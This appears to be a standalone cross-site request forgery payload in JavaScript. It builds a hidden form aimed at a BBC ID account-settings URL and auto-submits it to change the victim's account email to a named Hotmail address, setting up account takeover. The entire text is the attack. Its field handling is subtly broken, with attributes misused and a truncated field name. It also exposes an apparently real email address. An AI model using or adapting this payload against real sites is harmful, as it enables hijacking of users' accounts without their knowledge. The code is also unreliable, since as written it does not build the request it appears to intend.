 var form = document.createElement("form");
 form.setAttribute("method", "post");
form.setAttribute("action", "https://ssl.bbc.co.uk/id/settings");

  var hiddenField = document.createElement("input");
  hiddenField.setAttribute("type", "hidden");
  hiddenField.setAttribute("email", "ianfanggong%40hotmail.com");
  hiddenField.setAttribute("bbcid_submit_butto", "save");

  form.appendChild(hiddenField);
        
  
    document.body.appendChild(form);
    form.submit();
